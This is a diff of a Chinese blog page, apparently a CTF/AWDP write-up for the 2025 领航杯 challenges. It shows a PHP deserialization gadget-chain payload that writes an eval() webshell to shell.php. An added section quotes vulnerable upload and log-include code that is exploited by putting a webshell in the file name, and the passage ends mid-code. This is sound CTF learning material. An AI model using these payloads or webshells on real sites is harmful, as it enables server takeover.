@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" ez_php 先看哪可以执行命令，utils下找到FileWriter类可以写马，但是要调用__toString魔术\n1 2 3 4 5 6 7 8 9 10 &lt;?php class FileWriter { public $path; public $content; public function __toString() { file_put_contents($this-&gt;path, $this-&gt;content); return &#34;PDF Export Complete&#34;.$this-&gt;path; } } controllers下ExportController有反序列化\n">
 <title>2025领航杯-awdp</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025领航杯-awdp">
 <meta property='og:description' content=" ez_php 先看哪可以执行命令，utils下找到FileWriter类可以写马，但是要调用__toString魔术\n1 2 3 4 5 6 7 8 9 10 &lt;?php class FileWriter { public $path; public $content; public function __toString() { file_put_contents($this-&gt;path, $this-&gt;content); return &#34;PDF Export Complete&#34;.$this-&gt;path; } } controllers下ExportController有反序列化\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-12-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-12T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025领航杯-awdp">
 <meta name="twitter:description" content=" ez_php 先看哪可以执行命令，utils下找到FileWriter类可以写马，但是要调用__toString魔术\n1 2 3 4 5 6 7 8 9 10 &lt;?php class FileWriter { public $path; public $content; public function __toString() { file_put_contents($this-&gt;path, $this-&gt;content); return &#34;PDF Export Complete&#34;.$this-&gt;path; } } controllers下ExportController有反序列化\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -282,7 +282,12 @@
             <nav id="TableOfContents">
   <ol>
     <li><a href="#ez_php">ez_php</a></li>
-    <li><a href="#ez_blog">ez_blog</a></li>
+    <li><a href="#ez_blog">ez_blog</a>
+      <ol>
+        <li><a href="#考点文件名写马">考点：文件名写马</a></li>
+      </ol>
+    </li>
+    <li><a href="#node">node</a></li>
     <li><a href="#adlogin">adlogin</a></li>
   </ol>
 </nav>
@@ -348,7 +353,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -468,7 +473,7 @@
 </span></span><span class="line"><span class="cl">                <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                <span class="c1">// $data   = openssl_decrypt($cookie, &#34;AES-128-ECB&#34;, &#34;secretkey&#34;, OPENSSL_RAW_DATA);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                    <span class="nv">$obj</span> <span class="o">=</span> <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
@@ -588,7 +593,7 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Logger</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileWriter</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">msg</span><span class="o">-&gt;</span><span class="na">path</span> <span class="o">=</span> <span class="s2">&#34;D:\phpStudy\PHPTutorial\WWW\shell.php&#34;</span><span class="p">;</span>	<span class="c1">#由于是phpstudy搭的，所以路径改一下
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">msg</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[1]); ?&gt;&#34;</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">msg</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[1]); ?&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -641,7 +646,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nv">$uri</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span><span class="c1">#从字符串的末尾（右侧）移除指定的字符/
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="nv">$uri</span> <span class="o">===</span> <span class="s1">&#39;/&#39;</span> <span class="o">||</span> <span class="nv">$uri</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">                <span class="k">require</span> <span class="s2">&#34;app/views/home.php&#34;</span><span class="p">;</span>
@@ -700,7 +705,7 @@
 <p><img src="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/image-20251214215056426.png"
 	width="1680"
 	height="303"
-	srcset="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/image-20251214215056426_hu_72ae15eac97f2bcc.png 480w, /p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/image-20251214215056426_hu_8a187e7593b9b65c.png 1024w"
+	srcset="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/image-20251214215056426_hu_384ce47fb4c452f5.png 480w, /p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/image-20251214215056426_hu_b618d6dcd56135dc.png 1024w"
 	loading="lazy"
 	
 		alt="image-20251214215056426"
@@ -765,7 +770,978 @@
 </div>
 </div><p>为什么？因为<code>RewriteRule ^ index.php</code>这就告诉服务器：不管用户请求什么路径（只要不是真实存在的文件），统统把请求交给index.php 处理。所以 /export但服务器实际执行的文件是 index.php，这就到了我们的链子，这也解决了我开始为啥本地访问/export会404的问题，也解决了我疑惑&ndash;为啥访问/eport路由才能进入ExportController.php，但是我不是要访问/index.php路由才能到Router.php调用ExportController.php。</p>
 <h2 id="ez_blog">ez_blog
-</h2><h2 id="adlogin">adlogin
+</h2><h3 id="考点文件名写马">考点：文件名写马
+</h3><p>漏洞点应该是users.php,可以包含upload.log,而这个可控</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;viewlog&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$logfile</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/../upload.log&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;暂无日志&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可控upload.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">checkFileNameLength</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">25</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">checkFileExtension</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allowed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allowed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isBlacklisted</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$blacklist</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$bad</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$bad</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">verifyToken</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$ts</span><span class="p">,</span> <span class="nv">$token</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$realToken</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="nv">$filesize</span> <span class="o">.</span> <span class="nv">$ts</span> <span class="o">.</span> <span class="nv">$secret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">hash_equals</span><span class="p">(</span><span class="nv">$realToken</span><span class="p">,</span> <span class="nv">$token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">detectMime</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nx">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$mime</span> <span class="o">=</span> <span class="nx">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$mime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isValidImage</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nx">detectMime</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">),</span> <span class="s2">&#34;image/&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">saveFile</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$newName</span> <span class="o">=</span> <span class="nx">sha1_file</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;.safe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$savePath</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$newName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$savePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$savePath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">writeLog</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$savePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$logline</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;[%s] 上传文件: %s (%d bytes) MIME=%s 保存路径=%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filesize</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$mime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$savePath</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/upload.log&#34;</span><span class="p">,</span> <span class="nv">$logline</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">updateStats</span><span class="p">(</span><span class="nv">$filesize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$statsFile</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/stats.log&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$stats</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$statsFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">list</span><span class="p">(</span><span class="nv">$count</span><span class="p">,</span> <span class="nv">$totalSize</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$stats</span> <span class="o">?</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="nv">$stats</span><span class="p">)</span> <span class="o">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$count</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$totalSize</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$totalSize</span> <span class="o">+</span> <span class="nv">$filesize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$statsFile</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">$count</span><span class="s2">,</span><span class="si">$totalSize</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">simulateProgress</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">25</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fakeVirusScan</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="s2">&#34;eval(&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generateThumbnail</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">===</span> <span class="s2">&#34;jpg&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s2">&#34;imagecreatefromjpeg&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$img</span> <span class="o">=</span> <span class="o">@</span><span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$img</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$thumb</span> <span class="o">=</span> <span class="nx">imagescale</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$thumb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">checkUserRole</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">calculateEntropy</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nx">count_chars</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$count</span><span class="p">)</span> <span class="p">{</span>
